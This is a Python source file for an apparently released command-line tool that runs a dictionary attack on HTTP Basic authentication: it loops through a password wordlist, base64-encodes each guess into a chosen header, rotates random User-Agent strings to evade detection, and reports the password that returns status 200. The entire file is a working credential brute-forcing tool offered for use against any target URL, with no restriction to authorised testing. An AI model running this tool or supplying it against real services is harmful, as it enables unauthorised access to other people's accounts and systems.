import os
import sys
import requests
import base64
import argparse
import time
import random
from termcolor import colored
from tabulate import tabulate

import validators
from requests.exceptions import RequestException, Timeout, ConnectionError
from rich.console import Console
from rich.table import Table
from rich.progress import Progress

def print_banner():
    banner = """
    ██████╗ ███████╗███████╗██╗   ██╗███████╗███████╗
    ██╔══██╗██╔════╝██╔════╝██║   ██║██╔════╝██╔════╝
    ██║  ██║█████╗  █████╗  ██║   ██║███████╗█████╗  
    ██║  ██║██╔══╝  ██╔══╝  ██║   ██║╚════██║██╔══╝  
    ██████╔╝███████╗██║     ╚██████╔╝███████║███████╗
    ╚═════╝ ╚══════╝╚═╝      ╚═════╝ ╚══════╝╚══════╝

    Author: hxlxmjxbbxs
    Github: https://github.com/hxlxmjxbbxs
    Released: 2023/06/07
    """
    print(banner)

def validate_input(args):
    if not args.url or not validators.url(args.url):
        raise ValueError("Invalid URL provided.")

    if not args.header:
        raise ValueError("Header not provided.")

    if not args.wordlist or not os.path.isfile(args.wordlist):
        raise ValueError("Invalid wordlist file provided.")

    if not args.user_agents or not os.path.isfile(args.user_agents):
        raise ValueError("Invalid user agents file provided.")

def load_user_agents(user_agents_file):
    with open(user_agents_file, 'r') as f:
        return f.read().splitlines()

def encode_wordlist(wordlist):
    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            yield (line.strip(), base64.b64encode(line.strip().encode()).decode())

def format_time(seconds):
    seconds = int(seconds)
    minutes, seconds = divmod(seconds, 60)
    hours, minutes = divmod(minutes, 60)
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

def load_wordlist(wordlist):
    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    return [line.strip() for line in lines]

def dictionary_attack(url, header, wordlist, user_agents, method):
    user_agents = load_user_agents(user_agents)
    headers = {'User-Agent': '', header: ''}
    wordlist_words = load_wordlist(wordlist)
    wordlist_length = len(wordlist_words)

    start_time = time.time()

    console = Console()
    progress = Progress(console=console, auto_refresh=False)
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Current password", justify="left")
    table.add_column("Estimated remaining time", justify="left")
    table.add_column("Status code", justify="left")
    table.add_column("Content length", justify="left")

    with progress:
        task = progress.add_task("[cyan]Attacking...", total=wordlist_length)

        for i, word in enumerate(wordlist_words, 1):
            encoded_word = base64.b64encode(word.encode()).decode()

            headers['User-Agent'] = random.choice(user_agents)
            headers[header] = 'Basic ' + encoded_word

            try:
                # Dynamic HTTP method usage
                response = getattr(requests, method.lower())(url, headers=headers, timeout=5)
                elapsed_time = time.time() - start_time
                remaining_time = format_time(elapsed_time / i * (wordlist_length - i))
                status_code = response.status_code if response.status_code == 200 else colored(str(response.status_code), 'red')

                if response.status_code == 200:
                    progress.stop()
                    console.print(f"\nSuccess with: {word}")
                    return

            except (RequestException, Timeout, ConnectionError) as e:
                progress.update(task, advance=1)
                console.print(f"Request failed with error: {e}")
                continue

        progress.stop()
        console.print("\nAttack finished, no successful attempts")

if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description='Dictionary attack script')
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-H', '--header', help='Header to attack')
    parser.add_argument('-w', '--wordlist', help='Wordlist file to use')
    parser.add_argument('-a', '--user_agents', help='User-agent list file to use')
    parser.add_argument('-m', '--method', help='HTTP method to use', choices=['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH'], default='GET')

    args = parser.parse_args()

    try:
        validate_input(args)
    except ValueError as e:
        print(f"Error: {str(e)}")
        sys.exit(1)

    while True:
        try:
            dictionary_attack(args.url, args.header, args.wordlist, args.user_agents, args.method)
        except KeyboardInterrupt:
            confirmation = input("\nAre you sure you want to exit? Y/n ")
            if confirmation.lower() != 'n':
                print("Exiting the program.")
                sys.exit(0)
            print("Canceling the exit. Resuming the attack...")
